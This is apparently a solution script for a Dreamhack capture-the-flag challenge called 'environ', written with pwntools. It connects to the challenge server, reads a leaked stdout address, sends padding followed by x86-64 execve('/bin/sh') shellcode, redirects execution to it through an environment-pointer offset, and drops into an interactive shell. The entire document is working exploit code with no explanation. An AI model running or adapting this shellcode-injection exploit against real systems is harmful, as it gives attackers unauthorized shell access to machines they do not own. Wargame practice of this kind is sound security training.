from pwn import *

local = 0

if local == 1:
	p = process("./environ")
	env_offset = [0x1938]
else :
	p = remote("host1.dreamhack.games",8482)
	env_offset = [0x1918,0x1830] 

shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

p.recvuntil("stdout:")
stdout = int(p.recvline(),16)

log.info(hex(stdout))

payload1 = ""
payload1 += "a"*0x118
payload1 += shellcode

p.sendlineafter("Size:",str(0x128+len(shellcode)))

p.sendlineafter("Data:",payload1)

payload2 = str(stdout+env_offset[0])
pause()
p.sendlineafter("*jmp=",payload2)



p.interactive()